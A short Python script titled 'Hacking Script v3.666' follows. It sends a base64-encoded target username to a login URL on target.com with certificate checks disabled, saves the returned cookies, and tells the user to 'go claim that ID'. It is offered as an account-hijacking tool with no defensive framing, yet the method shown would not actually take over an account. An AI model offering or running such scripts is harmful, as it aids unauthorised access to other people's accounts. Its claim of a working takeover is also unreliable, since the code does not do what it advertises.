# Hacking Script v3.666

import requests, re, base64
from requests.packages import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def encode_username(username):
    encoded = base64.b64encode(username.encode()).decode()
    return encoded

def main():
    username = input("Enter the target username: ")
    encoded = encode_username(username)

    url = f"http://target.com/user/login?username={encoded}"

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, sdch',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    }

    session = requests.Session()
    response = session.get(url, headers=headers, verify=False)
    response.raise_for_status()

    cookies = session.cookies.get_dict()
    with open("cookies.txt", "w") as f:
        for key, val in cookies.items():
            f.write(f"{key}={val};")

    print("Cookies saved to cookies.txt. Now go claim that ID, you fucking hacking god!")

if __name__ == "__main__":
    main()
